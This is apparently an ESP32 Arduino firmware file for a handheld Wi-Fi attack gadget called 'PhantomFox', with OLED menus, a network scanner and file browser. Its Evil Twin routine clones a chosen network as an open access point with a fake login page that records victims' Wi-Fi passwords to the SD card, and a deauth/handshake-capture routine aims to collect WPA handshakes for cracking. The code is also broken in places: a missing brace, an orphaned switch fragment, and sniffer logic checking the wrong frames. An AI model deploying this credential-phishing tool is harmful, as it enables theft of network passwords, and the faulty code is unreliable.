#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Keypad.h>
#include <SD.h>
#include <WiFi.h>
#include <SPI.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

// Device configuration and version info
#define FIRMWARE_VERSION "v2.3.0"
#define DEVICE_NAME "PhantomFox Mk.I"
#define BUILD_DATE __DATE__
#define BUILD_TIME __TIME__

// I2C pins for display communication
#define I2C_SDA 21
#define I2C_SCL 22

// OLED display settings
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define OLED_ADDRESS 0x3C

// 2x2 directional keypad settings
#define KEYPAD_ROWS 2
#define KEYPAD_COLS 2
byte ROW_PINS[KEYPAD_ROWS] = {26, 27};
byte COL_PINS[KEYPAD_COLS] = {32, 33};
char KEYPAD_KEYS[KEYPAD_ROWS][KEYPAD_COLS] = {
	{'U', 'D'},
	{'L', 'R'}
};

// SD card SPI connection pins
#define SD_CS_PIN 5
#define SPI_MOSI 23
#define SPI_MISO 19
#define SPI_SCK 18

// User interface timing and display settings
#define MAX_DISPLAY_ITEMS 4
#define SCREEN_TIMEOUT 60000	// Turn off screen after 60 seconds of inactivity
#define STATUS_TIMEOUT 3000
#define MONITOR_UPDATE_INTERVAL 1000

// Default network settings for attacks
#define EVIL_TWIN_SSID "Free_WiFi"
#define WEB_SERVER_PORT 80
#define DNS_PORT 53

// Hardware object initialization
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
Keypad keypad = Keypad(makeKeymap(KEYPAD_KEYS), ROW_PINS, COL_PINS, KEYPAD_ROWS, KEYPAD_COLS);
WebServer webServer(WEB_SERVER_PORT);
DNSServer dnsServer;

// Menu system states and navigation
enum MenuState {
	MAIN_MENU,
	SYSTEM_MONITOR,
	NETWORK_TOOLS,
	PENTEST_SUITE,
	FILE_EXPLORER,
	SYSTEM_INFO,
	PERFORMANCE_MONITOR,
	STORAGE_ANALYZER,
	WIFI_SCANNER,
	EVIL_TWIN,
	NETWORK_ACTIONS,
	LOG_VIEWER
};

struct MenuItem {
	const char* name;
	MenuState state;
	bool implemented;
};

MenuItem mainMenuItems[] = {
	{"System Monitor", SYSTEM_MONITOR, true},
	{"Network Tools", NETWORK_TOOLS, true},
	{"Pentest Suite", PENTEST_SUITE, true},
	{"File Explorer", FILE_EXPLORER, true}
};

MenuItem systemMonitorItems[] = {
	{"System Info", SYSTEM_INFO, true},
	{"Performance", PERFORMANCE_MONITOR, true},
	{"Storage", STORAGE_ANALYZER, true}
};

MenuItem networkToolsItems[] = {
	{"WiFi Scanner", WIFI_SCANNER, true}
};

MenuItem pentestItems[] = {
	{"Evil Twin", EVIL_TWIN, true}
};

MenuItem networkActions[] = {
	{"Deauth Attack", NETWORK_ACTIONS, true},
	{"Evil Twin", EVIL_TWIN, true},
	{"Back", WIFI_SCANNER, true}
};

const int MAIN_MENU_SIZE = sizeof(mainMenuItems) / sizeof(mainMenuItems[0]);
const int SYSTEM_MONITOR_SIZE = sizeof(systemMonitorItems) / sizeof(systemMonitorItems[0]);
const int NETWORK_TOOLS_SIZE = sizeof(networkToolsItems) / sizeof(networkToolsItems[0]);
const int PENTEST_SIZE = sizeof(pentestItems) / sizeof(pentestItems[0]);
const int NETWORK_ACTIONS_SIZE = sizeof(networkActions) / sizeof(networkActions[0]);

// Global state variables for menu navigation and device status
MenuState currentState = MAIN_MENU;
MenuState previousState = MAIN_MENU;
int selectedItem = 0;
int menuOffset = 0;
unsigned long lastActivity = 0;
unsigned long lastMonitorUpdate = 0;
bool screenOn = true;
String statusMessage = "";
unsigned long statusTimeout = 0;

// Variables for tracking active penetration testing attacks
bool evilTwinActive = false;
bool deauthActive = false;
unsigned long attackStartTime = 0;
String selectedNetwork = "";
String selectedBSSID = "";
int selectedChannel = 0;

// System resource monitoring data
struct SystemMetrics {
	size_t freeHeap;
	size_t totalHeap;
	uint8_t cpuFreq;
	uint32_t uptime;
	uint64_t sdTotalBytes;
	uint64_t sdUsedBytes;
};

SystemMetrics metrics = {0};

// WiFi network scanning and storage
struct WiFiNetwork {
	String ssid;
	String bssid;
	int rssi;
	int channel;
	bool selected;
};
WiFiNetwork networks[20];
int networkCount = 0;

// File system navigation
struct FileEntry {
	String name;
	bool isDirectory;
};
FileEntry fileEntries[20];
int fileCount = 0;
String currentPath = "/";

// WiFi handshake capture functionality
bool captureHandshake = false;
int handshakePackets = 0;

bool handshakeCaptured = false;
File handshakeFile;

// Helper functions for device operation
void resetActivity() {
	lastActivity = millis();
	if (!screenOn) {
		screenOn = true;
		display.ssd1306_command(SSD1306_DISPLAYON);
	}
}

void setStatus(const __FlashStringHelper* message, unsigned long timeout = STATUS_TIMEOUT) {
	statusMessage = String(message);
	statusTimeout = millis() + timeout;
}

String formatBytes(uint64_t bytes) {
	if (bytes < 1024) return String((uint32_t)bytes) + F(" B");
	else if (bytes < 1024 * 1024) return String((uint32_t)(bytes / 1024)) + F(" KB");
	else if (bytes < 1024 * 1024 * 1024) return String((uint32_t)(bytes / (1024 * 1024))) + F(" MB");
	else return String((uint32_t)(bytes / (1024 * 1024 * 1024))) + F(" GB");
}

String formatUptime(uint32_t ms) {
	uint32_t seconds = ms / 1000;
	uint32_t minutes = seconds / 60;
	uint32_t hours = minutes / 60;
	uint32_t days = hours / 24;
	
	if (days > 0) return String(days) + F("d ") + String(hours % 24) + F("h");
	else if (hours > 0) return String(hours) + F("h ") + String(minutes % 60) + F("m");
	else if (minutes > 0) return String(minutes) + F("m ") + String(seconds % 60) + F("s");
	else return String(seconds) + F("s");
}

void updateSystemMetrics() {
	if (millis() - lastMonitorUpdate < MONITOR_UPDATE_INTERVAL) return;
	
	metrics.totalHeap = ESP.getHeapSize();
	metrics.freeHeap = ESP.getFreeHeap();
	metrics.cpuFreq = ESP.getCpuFreqMHz();
	metrics.uptime = millis();
	
	if (SD.cardType() != CARD_NONE) {
		metrics.sdTotalBytes = SD.totalBytes();
		metrics.sdUsedBytes = SD.usedBytes();
	}
	
	lastMonitorUpdate = millis();
}

// Fix I2C communication issues with the display
void recoverI2C() {
	Wire.end();
	pinMode(I2C_SDA, INPUT_PULLUP);
	pinMode(I2C_SCL, INPUT_PULLUP);
	delay(250);
	Wire.begin(I2C_SDA, I2C_SCL);
	Wire.setClock(100000);	// Use slower speed for better reliability
}

// Start up the OLED display with error recovery
bool initDisplay() {
	for (int i = 0; i < 3; i++) {
		if (display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
			return true;
		}
		Serial.println(F("Display init failed, retrying..."));
		recoverI2C();
		delay(500);
	}
	return false;
}

// OLED display drawing functions
void drawHeader() {
	display.setTextSize(1);
	display.setCursor(0, 0);
	display.print(F("PhantomFox"));
	
	// Show current attack status in top right
	display.setCursor(90, 0);
	if (deauthActive) display.print(F("[ATK]"));
	else if (evilTwinActive) display.print(F("[EVL]"));
	else if (captureHandshake) display.print(F("[CAP]"));
	else display.print(F("[RDY]"));
	
	display.drawLine(0, 9, SCREEN_WIDTH - 1, 9, SSD1306_WHITE);
}

void drawStatus() {
	if (statusMessage.length() > 0 && millis() < statusTimeout) {
		display.setCursor(0, 56);
		display.setTextSize(1);
		String msg = statusMessage;
		if (msg.length() > 20) msg = msg.substring(0, 20) + F("..");
		display.print(msg);
	}
}

void drawMenu(MenuItem* items, int itemCount, const __FlashStringHelper* title = NULL) {
	// Make sure the display is still responding
	Wire.beginTransmission(OLED_ADDRESS);
	if (Wire.endTransmission() != 0) {
		recoverI2C();
		initDisplay();
	}
	
	display.clearDisplay();
	drawHeader();
	
	if (title) {
		display.setTextSize(1);
		display.setCursor(0, 12);
		display.println(title);
		display.drawLine(0, 21, SCREEN_WIDTH - 1, 21, SSD1306_WHITE);
	}
	
	int startY = title ? 24 : 12;
	
	for (int i = 0; i < MAX_DISPLAY_ITEMS && (menuOffset + i) < itemCount; i++) {
		int itemIndex = menuOffset + i;
		int y = startY + (i * 10);
		
		display.setCursor(0, y);
		
		if (itemIndex == selectedItem) {
			display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
			display.setTextColor(SSD1306_BLACK);
			display.print(F(">"));
		} else {
			display.setTextColor(SSD1306_WHITE);
			display.print(F(" "));
		}
		
		display.print(items[itemIndex].name);
		
		if (!items[itemIndex].implemented) {
			display.print(F(" [WIP]"));
		}
		
		display.setTextColor(SSD1306_WHITE);
	}
	
	drawStatus();
	
	display.display();
}

// System monitoring and information displays
void showSystemInfo() {
	updateSystemMetrics();
	
	display.clearDisplay();
	drawHeader();
	
	display.setTextSize(1);
	display.setCursor(0, 12);
	display.println(F("System Info"));
	
	display.setCursor(0, 24);
	display.print(F("FW: "));
	display.print(FIRMWARE_VERSION);
	
	display.setCursor(0, 34);
	display.print(F("CPU: "));
	display.print(metrics.cpuFreq);
	display.println(F("MHz"));
	
	display.setCursor(0, 44);
	display.print(F("RAM: "));
	display.print(formatBytes(metrics.freeHeap));
	display.print(F("/"));
	display.print(formatBytes(metrics.totalHeap));
	
	display.setCursor(0, 54);
	display.print(F("Uptime: "));
	display.print(formatUptime(metrics.uptime));
	
	display.display();
	
	while (keypad.getKey() != 'L') {
		delay(50);
		resetActivity();
	}
	currentState = SYSTEM_MONITOR;
}

void showPerformanceMonitor() {
	bool monitoring = true;
	unsigned long lastUpdate = 0;
	
	while (monitoring) {
		if (millis() - lastUpdate > 1000) {
			updateSystemMetrics();
			
			display.clearDisplay();
			drawHeader();
			
			display.setTextSize(1);
			display.setCursor(0, 12);
			display.println(F("Performance"));
			
			// Calculate memory usage percentage
			float memUsage = ((float)(metrics.totalHeap - metrics.freeHeap) / metrics.totalHeap) * 100;
			display.setCursor(0, 24);
			display.print(F("RAM: "));
			display.print((int)memUsage);
			display.println(F("%"));
			
			display.display();
			lastUpdate = millis();
		}
		
		if (keypad.getKey() == 'L') {
			monitoring = false;
			currentState = SYSTEM_MONITOR;
		}
		
		delay(100);
		resetActivity();
	}
}

void showStorageAnalyzer() {
	updateSystemMetrics();
	
	display.clearDisplay();
	drawHeader();
	
	display.setTextSize(1);
	display.setCursor(0, 12);
	display.println(F("Storage"));
	
	// Show flash memory usage
	display.setCursor(0, 24);
	display.print(F("Flash: "));
	display.print(formatBytes(ESP.getSketchSize()));
	
	// Show SD card status and usage
	if (metrics.sdTotalBytes > 0) {
		display.setCursor(0, 34);
		display.print(F("SD: "));
		display.print(formatBytes(metrics.sdUsedBytes));
		display.print(F("/"));
		display.print(formatBytes(metrics.sdTotalBytes));
	} else {
		display.setCursor(0, 34);
		display.print(F("SD: Not detected"));
	}
	
	display.display();
	
	while (keypad.getKey() != 'L') {
		delay(50);
		resetActivity();
	}
	currentState = SYSTEM_MONITOR;
}

// WiFi scanning and network analysis tools
void performWiFiScan() {
	setStatus(F("Scanning..."));
	display.clearDisplay();
	drawHeader();
	display.setCursor(0, 20);
	display.println(F("Scanning WiFi..."));
	display.display();
	
	WiFi.mode(WIFI_STA);
	WiFi.disconnect();
	delay(100);
	
	networkCount = WiFi.scanNetworks();
	
	if (networkCount == 0) {
		setStatus(F("No networks found"));
		delay(2000);
		currentState = NETWORK_TOOLS;
		return;
	}
	
	// Save discovered network information
	for (int i = 0; i < min(networkCount, 20); i++) {
		networks[i].ssid = WiFi.SSID(i);
		networks[i].bssid = WiFi.BSSIDstr(i);
		networks[i].rssi = WiFi.RSSI(i);
		networks[i].channel = WiFi.channel(i);
		networks[i].selected = false;
	}
	
	int currentPage = 0;
	int totalPages = (networkCount + MAX_DISPLAY_ITEMS - 1) / MAX_DISPLAY_ITEMS;
	bool viewing = true;
	selectedItem = 0;
	
	while (viewing) {
		display.clearDisplay();
		drawHeader();
		
		display.setTextSize(1);
		display.setCursor(0, 12);
		display.print(F("Networks ("));
		display.print(currentPage + 1);
		display.print(F("/"));
		display.print(totalPages);
		display.println(F(")"));
		
		for (int i = 0; i < MAX_DISPLAY_ITEMS; i++) {
			int networkIndex = currentPage * MAX_DISPLAY_ITEMS + i;
			if (networkIndex >= networkCount) break;
			
			int y = 24 + (i * 10);
			display.setCursor(0, y);
			
			// Highlight currently selected network
			if (i == selectedItem) {
				display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
				display.setTextColor(SSD1306_BLACK);
			} else {
				display.setTextColor(SSD1306_WHITE);
			}
			
			String ssid = networks[networkIndex].ssid;
			if (ssid.length() > 12) ssid = ssid.substring(0, 12) + F("..");
			
			display.print(ssid);
			display.print(F(" "));
			display.print(networks[networkIndex].rssi);
			display.print(F("dB"));
			
			display.setTextColor(SSD1306_WHITE);
		}
		
		display.setCursor(0, 56);
		display.print(F("L:Back R:Select"));
		display.display();
		
		char key = keypad.waitForKey();
		resetActivity();
		
		switch (key) {
			case 'U': 
				if (selectedItem > 0) selectedItem--;
				else if (currentPage > 0) {
					currentPage--;
					selectedItem = MAX_DISPLAY_ITEMS - 1;
				}
				break;
			case 'D': 
				if (selectedItem < MAX_DISPLAY_ITEMS - 1 && 
					(currentPage * MAX_DISPLAY_ITEMS + selectedItem + 1) < networkCount) {
					selectedItem++;
				} else if (currentPage < totalPages - 1) {
					currentPage++;
					selectedItem = 0;
				}
				break;
			case 'L': 
				viewing = false; 
				currentState = NETWORK_TOOLS;
				break;
			case 'R': 
				selectedNetwork = networks[currentPage * MAX_DISPLAY_ITEMS + selectedItem].ssid;
				selectedBSSID = networks[currentPage * MAX_DISPLAY_ITEMS + selectedItem].bssid;
				selectedChannel = networks[currentPage * MAX_DISPLAY_ITEMS + selectedItem].channel;
				currentState = NETWORK_ACTIONS;
				viewing = false;
				break;
		}
	}
	
	WiFi.mode(WIFI_OFF);
}

void showNetworkActions() {
	selectedItem = 0;
	menuOffset = 0;
	
	while (currentState == NETWORK_ACTIONS) {
		drawMenu(networkActions, NETWORK_ACTIONS_SIZE, F("Network Actions"));
		
		char key = keypad.waitForKey();
		resetActivity();
		
		switch (key) {
			case 'U': if (selectedItem > 0) selectedItem--; break;
			case 'D': if (selectedItem < NETWORK_ACTIONS_SIZE - 1) selectedItem++; break;
			case 'L': currentState = WIFI_SCANNER; break;
			case 'R': 
				switch (networkActions[selectedItem].state) {
					case NETWORK_ACTIONS: 
						deauthActive = true;
						performDeauthAttack(true);	// Start attack with handshake capture
						break;
					case EVIL_TWIN: 
						startEvilTwin(); 
						break;
					case WIFI_SCANNER: 
						currentState = WIFI_SCANNER; 
						break;
					default: break;
				}
				break;
		}
	}
}

// SD card file system browser and log viewer
void listFiles() {
	File root = SD.open(currentPath);
	if (!root) {
		setStatus(F("Open failed"));
		return;
	}

	fileCount = 0;
	File file = root.openNextFile();
	while (file && fileCount < 20) {
		fileEntries[fileCount].name = file.name();
		fileEntries[fileCount].isDirectory = file.isDirectory();
		fileCount++;
		file = root.openNextFile();
	}
	root.close();

	int currentPage = 0;
	int totalPages = (fileCount + MAX_DISPLAY_ITEMS - 1) / MAX_DISPLAY_ITEMS;
	bool viewing = true;
	selectedItem = 0;
	
	while (viewing) {
		display.clearDisplay();
		drawHeader();
		
		display.setTextSize(1);
		display.setCursor(0, 12);
		display.print(F("Files: "));
		display.println(currentPath);
		
		for (int i = 0; i < MAX_DISPLAY_ITEMS; i++) {
			int fileIndex = currentPage * MAX_DISPLAY_ITEMS + i;
			if (fileIndex >= fileCount) break;
			
			int y = 24 + (i * 10);
			display.setCursor(0, y);
			
			// Highlight currently selected file/folder
			if (i == selectedItem) {
				display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
				display.setTextColor(SSD1306_BLACK);
			}
			
			String name = fileEntries[fileIndex].name;
			if (name.length() > 16) name = name.substring(0, 16) + F("..");
			
			if (fileEntries[fileIndex].isDirectory) {
				display.print(F("["));
				display.print(name);
				display.print(F("]"));
			} else {
				display.print(name);
			}
			
			display.setTextColor(SSD1306_WHITE);
		}
		
		display.setCursor(0, 56);
		display.print(F("L:Back R:Open"));
		display.display();
		
		char key = keypad.waitForKey();
		resetActivity();
		
		switch (key) {
			case 'U': 
				if (selectedItem > 0) selectedItem--;
				else if (currentPage > 0) {
					currentPage--;
					selectedItem = MAX_DISPLAY_ITEMS - 1;
				}
				break;
			case 'D': 
				if (selectedItem < MAX_DISPLAY_ITEMS - 1 && 
					(currentPage * MAX_DISPLAY_ITEMS + selectedItem + 1) < fileCount) {
					selectedItem++;
				} else if (currentPage < totalPages - 1) {
					currentPage++;
					selectedItem = 0;
				}
				break;
			case 'L': 
				if (currentPath != "/") {
					// Navigate up one directory level
					int lastSlash = currentPath.lastIndexOf('/', currentPath.length()-2);
					if (lastSlash != -1) {
						currentPath = currentPath.substring(0, lastSlash+1);
					}
				} else {
					// Return to main menu from root directory
					viewing = false;
					currentState = MAIN_MENU;
				}
				break;
			case 'R': 
				{
					int selectedIndex = currentPage * MAX_DISPLAY_ITEMS + selectedItem;
					if (fileEntries[selectedIndex].isDirectory) {
						// Enter selected directory
						currentPath += fileEntries[selectedIndex].name + "/";
					} else {
						// Open selected file for viewing
						File logFile = SD.open(currentPath + fileEntries[selectedIndex].name);
						if (logFile) {
							viewLogFile(logFile);
							logFile.close();
						} else {
							setStatus(F("Open failed"));
						}
					}
					// Refresh the file listing
					root = SD.open(currentPath);
					if (root) {
						fileCount = 0;
						file = root.openNextFile();
						while (file && fileCount < 20) {
							fileEntries[fileCount].name = file.name();
							fileEntries[fileCount].isDirectory = file.isDirectory();
							fileCount++;
							file = root.openNextFile();
						}
						root.close();
						currentPage = 0;
						selectedItem = 0;
					}
				}
				break;
		}
	}
}

void viewLogFile(File file) {
	if (!file) {
		setStatus(F("File not open"));
		return;
	}

	int currentLine = 0;
	int totalLines = 0;
	
	// Count total lines in file
	while (file.available()) {
		file.readStringUntil('\n');
		totalLines++;
	}
	file.seek(0);
	
	bool viewing = true;
	selectedItem = 0;
	
	while (viewing) {
		file.seek(0);
		// Skip to current viewing position
		for (int i = 0; i < currentLine; i++) {
			file.readStringUntil('\n');
		}
		
		display.clearDisplay();
		drawHeader();
		display.setCursor(0, 12);
		display.print(F("Log: "));
		display.println(file.name());
		
		// Display up to 4 lines at a time
		for (int i = 0; i < 4; i++) {
			if (file.available()) {
				String line = file.readStringUntil('\n');
				if (line.length() > 20) line = line.substring(0, 20) + F("..");
				display.setCursor(0, 24 + (i * 10));
				display.print(line);
			}
		}
		
		display.setCursor(0, 56);
		display.print(F("L:Back U/D:Scroll"));
		display.display();
		
		char key = keypad.waitForKey();
		resetActivity();
		
		switch (key) {
			case 'U': 
				if (currentLine > 0) {
					currentLine--;
				}
				break;
			case 'D': 
				if (currentLine < totalLines - 4) {
					currentLine++;
				}
				break;
			case 'L': 
				viewing = false;
				break;
		}
	}
}

// Evil Twin attack for credential harvesting
void startEvilTwin() {
	if (selectedNetwork == "") {
		setStatus(F("No network selected"));
		delay(2000);
		currentState = NETWORK_ACTIONS;
		return;
	}
	
	display.clearDisplay();
	drawHeader();
	display.setCursor(0, 15);
	display.println(F("Starting Evil Twin..."));
	display.display();
	
	WiFi.mode(WIFI_AP);
	WiFi.softAP(selectedNetwork.c_str());	// Create open network with target name
	
	dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
	
	webServer.onNotFound([]() {
		String html = F("<html><head><title>WiFi Login</title></head><body>");
		html += F("<h2>Network Login Required</h2>");
		html += F("<form method='POST' action='/login'>");
		html += F("Password: <input type='password' name='password' required><br><br>");
		html += F("<input type='submit' value='Connect'>");
		html += F("</form></body></html>");
		webServer.send(200, F("text/html"), html);
	});
	
	webServer.on("/login", HTTP_POST, []() {
		String password = webServer.arg("password");
		
		// Save captured credentials to SD card
		File logFile = SD.open("/captured.txt", FILE_APPEND);
		if (logFile) {
			logFile.print(F("Network: "));
			logFile.println(selectedNetwork);
			logFile.print(F("Password: "));
			logFile.println(password);
			logFile.print(F("Time: "));
			logFile.println(millis());
			logFile.println(F("----------------"));
			logFile.close();
		}
		
		webServer.send(200, F("text/html"), F("<h2>Connection Failed. Please try again.</h2>"));
	});
	
	webServer.begin();
	evilTwinActive = true;
	attackStartTime = millis();
	
	setStatus(F("Evil Twin Active"));
	
	while (evilTwinActive) {
		dnsServer.processNextRequest();
		webServer.handleClient();
		
		display.clearDisplay();
		drawHeader();
		display.setCursor(0, 12);
		display.println(F("Evil Twin Attack"));
		display.setCursor(0, 24);
		display.print(F("SSID: "));
		display.println(selectedNetwork);
		display.setCursor(0, 34);
		display.print(F("Clients: "));
		display.println(WiFi.softAPgetStationNum());
		display.setCursor(0, 44);
		display.print(F("Runtime: "));
		display.println(formatUptime(millis() - attackStartTime));
		display.setCursor(0, 54);
		display.print(F("L:Stop"));
		display.display();
		
		if (keypad.getKey() == 'L') {
			evilTwinActive = false;
			webServer.stop();
			dnsServer.stop();
			WiFi.mode(WIFI_OFF);
			currentState = NETWORK_ACTIONS;
		}
		
		delay(100);
		resetActivity();
	}
}

// Deauthentication attack with optional handshake capture
void performDeauthAttack(bool captureHandshakeMode) {
	if (selectedNetwork == "") {
		setStatus(F("No network selected"));
		delay(2000);
		currentState = NETWORK_ACTIONS;
		return;
	}
	
	deauthActive = true;
	captureHandshake = captureHandshakeMode;
	attackStartTime = millis();
	handshakePackets = 0;
	
	if (captureHandshake) {
		setupPacketCapture();
		setStatus(F("Starting handshake capture..."));
	} else {
		setStatus(F("Starting deauth attack..."));
	}

	while (deauthActive) {
		display.clearDisplay();
		drawHeader();
		display.setCursor(0, 12);
		display.println(F("Deauth Attack"));
		display.setCursor(0, 24);
		display.print(F("Target: "));
		display.println(selectedNetwork.substring(0, 10));
		
		if (captureHandshake) {
			display.setCursor(0, 34);
			display.print(F("Handshake: "));
			display.print(handshakePackets);
			display.print(F("/4 pkts"));
		}
		
		display.setCursor(0, 44);
		display.print(F("Runtime: "));
		display.println(formatUptime(millis() - attackStartTime));
		display.setCursor(0, 54);
		display.print(F("L:Stop"));
		display.display();

		if (keypad.getKey() == 'L') {
			deauthActive = false;
			
			if (captureHandshake) {
				esp_wifi_set_promiscuous(false);
				if (handshakeFile) handshakeFile.close();
				
				if (handshakePackets >= 4) {
					setStatus(F("Handshake captured!"));
					// Convert captured data for analysis tools
					convertToHccapx(selectedBSSID);
				} else {
					setStatus(F("Capture incomplete"));
				}
			}
			
			currentState = NETWORK_ACTIONS;
		}
		
		delay(100);
		resetActivity();
	}
}

void convertToHccapx(String bssid) {
	File pcapFile = SD.open("/handshakes/" + bssid + ".pcap");
	File hccapxFile = SD.open("/handshakes/" + bssid + ".hccapx", FILE_WRITE);
	
	if (pcapFile && hccapxFile) {
		// Basic conversion logic - real implementation would parse EAPOL packets
		uint8_t hccapxHeader[32] = {0};
		pcapFile.read(hccapxHeader, 32);
		hccapxFile.write(hccapxHeader, 32);
		
		pcapFile.close();
		hccapxFile.close();
}

void setupPacketCapture() {
	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);	// Required for monitor mode
	esp_wifi_start();
	
	// Set to same channel as target network
	esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
	
	// Enable promiscuous mode and set callback
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
}

void wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
	
	// Look for EAPOL packets (handshake data)
	if (type == WIFI_PKT_MGMT && pkt->payload[0] == 0x80) {
		// Verify packet is from target network
		if (memcmp(pkt->payload + 4, selectedBSSID.c_str(), 6) == 0) {
			if (!handshakeCaptured) {
				handshakeFile = SD.open("/handshakes/" + selectedBSSID + ".pcap", FILE_WRITE);
				handshakeCaptured = true;
			}
			
			if (handshakeFile) {
				// Save packet in PCAP format
				writePCAPHeader(handshakeFile, pkt, ctrl.sig_len);
				handshakePackets++;
			}
		}
	}
}

void writePCAPHeader(File &file, wifi_promiscuous_pkt_t *pkt, uint32_t len) {
	// Basic PCAP header format
	uint32_t ts_sec = millis() / 1000;
	uint32_t ts_usec = millis() % 1000;
	uint32_t incl_len = len < 64 ? len : 64;	// Limit packet size
	uint32_t orig_len = len;
	
	file.write((uint8_t*)&ts_sec, 4);
	file.write((uint8_t*)&ts_usec, 4);
	file.write((uint8_t*)&incl_len, 4);
	file.write((uint8_t*)&orig_len, 4);
	file.write(pkt->payload, incl_len);
}

// Main application control loop and navigation
void handleMenuNavigation() {
	char key = keypad.getKey();
	if (!key) return;

	resetActivity();

	switch (currentState) {
		case MAIN_MENU:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < MAIN_MENU_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = mainMenuItems[selectedItem].state;
				selectedItem = 0;
			}
			break;

		case SYSTEM_MONITOR:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < SYSTEM_MONITOR_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = systemMonitorItems[selectedItem].state;
				selectedItem = 0;
			}
			if (key == 'L') currentState = MAIN_MENU;
			break;

		case NETWORK_TOOLS:
			if (key == 'U' && selectedItem > 0) selectedItem--;
			if (key == 'D' && selectedItem < NETWORK_TOOLS_SIZE - 1) selectedItem++;
			if (key == 'R') {
				previousState = currentState;
				currentState = networkToolsItems[selectedItem].state;
				selectedItem = 0;
			}
			if (key == 'L') currentState = MAIN_MENU;
			break;

			}
			if (key == 'L') currentState = MAIN_MENU;
			break;

		case FILE_EXPLORER:
			if (key == 'L') currentState = MAIN_MENU;
			break;
			
		case NETWORK_ACTIONS:
			if (key == 'L') currentState = WIFI_SCANNER;
			break;

		default:
			if (key == 'L') currentState = previousState;
			break;
	}
}

void drawCurrentState() {
	switch (currentState) {
		case MAIN_MENU:
			drawMenu(mainMenuItems, MAIN_MENU_SIZE, F("Main Menu"));
			break;
		case SYSTEM_MONITOR:
			drawMenu(systemMonitorItems, SYSTEM_MONITOR_SIZE, F("System Monitor"));
			break;
		case NETWORK_TOOLS:
			drawMenu(networkToolsItems, NETWORK_TOOLS_SIZE, F("Network Tools"));
			break;
		case PENTEST_SUITE:
			drawMenu(pentestItems, PENTEST_SIZE, F("Pentest Suite"));
			break;
		case FILE_EXPLORER:
			listFiles();
			break;
		case SYSTEM_INFO:
			showSystemInfo();
			break;
		case PERFORMANCE_MONITOR:
			showPerformanceMonitor();
			break;
		case STORAGE_ANALYZER:
			showStorageAnalyzer();
			break;
		case WIFI_SCANNER:
			performWiFiScan();
			break;
		case EVIL_TWIN:
			startEvilTwin();
			break;
		case NETWORK_ACTIONS:
			showNetworkActions();
			break;
		case LOG_VIEWER:
			// File viewing is handled within the file explorer
			break;
		default:
			currentState = MAIN_MENU;
			break;
	}
}

void setup() {
	Serial.begin(115200);
	
	// Start I2C communication for display
	Wire.begin(I2C_SDA, I2C_SCL);
	Wire.setClock(100000);	// Use conservative speed for reliability

	// Initialize OLED display with error recovery
	if (!initDisplay()) {
		Serial.println(F("Fatal: OLED not found"));
		while(1);	// Stop execution if display fails
	}
	display.clearDisplay();
	display.setTextColor(SSD1306_WHITE);
	
	// Initialize SD card storage
	SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
	if (!SD.begin(SD_CS_PIN)) {
		setStatus(F("SD init failed"));
	} else {
		// Create directory for storing captured handshakes
		if (!SD.exists("/handshakes")) {
			SD.mkdir("/handshakes");
		}
	}
	
	// Display startup screen
	display.clearDisplay();
	display.setCursor(0, 0);
	display.println(F("PhantomFox"));
	display.println(F("v2.3.0"));
	display.display();
	delay(1000);
	
	// Initialize system monitoring
	updateSystemMetrics();
	
	currentState = MAIN_MENU;
	lastActivity = millis();
}

void loop() {
	// Turn off screen after inactivity timeout
	if (screenOn && millis() - lastActivity > SCREEN_TIMEOUT) {
		display.ssd1306_command(SSD1306_DISPLAYOFF);
		screenOn = false;
	}
	
	handleMenuNavigation();
	drawCurrentState();
	
	// Clear status messages after timeout
	if (statusMessage.length() > 0 && millis() > statusTimeout) {
		statusMessage = "";
	}
	
	// Keep system metrics current
	updateSystemMetrics();
	
	delay(50);
}